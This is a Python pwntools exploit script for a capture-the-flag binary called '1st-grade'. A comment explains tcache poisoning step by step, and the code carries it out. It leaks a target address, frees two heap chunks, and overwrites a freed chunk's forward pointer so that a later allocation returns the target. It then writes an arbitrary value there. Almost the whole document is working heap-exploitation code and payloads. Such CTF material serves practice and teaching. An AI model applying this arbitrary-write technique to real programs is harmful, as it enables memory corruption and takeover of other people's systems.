from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./1st-grade")
#libc = ELF("")
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}


#p = process("./1st-grade")
p = gdb.debug("./1st-grade", '''
break *__libc_start_main
''')

'''
1. Enumerate Input
2. Check Interactions
3. Pwn


TCACHE POISONING


    MALLOC 1 (ask for a chunk of smallish size)
    MALLOC 2 (ask for another chunk of the same size)
    FREE 1 (this makes the TCACHEBIN point at chunk1 TC->1)
    FREE 2 (this makes the TCACHEBIN point at chunk2: TC->2->1)
    EDIT 2 (this changes the contents in chunk2 to point to ANY ADDRESS: TC->2->TARGET)
    MALLOC 3 (this pops 2 off the linked-list/tcache bin: TC->TARGET)
    MALLOC 4 (you now have target in hand for arbitrary writing)
    - 4th malloc will write what is in TARGET




'''

p.recvline()
p.sendline('5')

# Leak target address:
p.recvuntil('location: ')
target_leak = p.recvline().strip()
target = int(target_leak, 16)

print('Target leak: ', hex(target))

# allocate 1st chunk
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'1')


# allocate 2nd chunk
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'2')

# free 1st chunk
p.recvline()
p.sendline(b'3')
p.recvline()
p.sendline(b'1')

# free 2nd chunk
p.recvline()
p.sendline(b'3')
p.recvline()
p.sendline(b'2')

# edit 2nd chunk (Write to 2nd freed chunk)
p.recvline()
p.sendline(b'2')
p.recvline()
p.sendline(b'2')

# payload
payload = p64(target)
p.recvline()
p.sendline(payload)

# allocate 3rd chunk (Grabs 2nd freed chunk LIFO, moves target into 1st chunk)
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'3')

# allocate 4th chunk (Grabs 1st freed chunk that includes target in fd)
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'4')

# Edit 4th allocated chunk. (Write target address in 1st chunk to an address)
pause()
p.recvline()
p.sendline(b'2')
p.recvline()
p.sendline(b'4')

# payload
payload = p64(0xdeadb007)
p.recvline()
pause()
p.sendline(payload)

# menu
p.recvline()
p.interactive()

